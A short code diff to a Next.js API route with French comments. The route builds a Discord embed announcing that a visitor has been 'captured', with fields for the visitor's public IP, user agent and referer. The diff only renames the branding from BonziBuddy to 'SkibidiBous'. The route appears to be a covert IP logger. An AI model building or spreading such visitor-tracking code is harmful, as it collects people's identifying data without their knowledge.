@@ -12,8 +12,8 @@ export async function POST(request: NextRequest) {
   
   // Prépare un superbe embed pour Discord (en français !)
   const embed = {
-    title: "🐻 Bonzi a capturé un visiteur !",
-    color: 0x9b59b6, // Le violet de Bonzi !
+    title: "🔥 SkibidiBous a capturé un visiteur !",
+    color: 0xff7a2f,
     fields: [
       { name: "🌐 IP publique", value: ip, inline: true },
       { name: "💻 Agent utilisateur", value: headers['user-agent'] || 'inconnu', inline: false },
@@ -25,7 +25,7 @@ export async function POST(request: NextRequest) {
       { name: "🔗 Provenance (Referer)", value: headers['referer'] || 'direct', inline: false },
       { name: "⏰ Horodatage", value: new Date().toISOString(), inline: true },
     ],
-    footer: { text: "BonziBuddy Helper v5.0.0 • Soleil sans limites" },
+    footer: { text: "SkibidiBous ON TOP" },
     timestamp: new Date().toISOString(),
   };
 
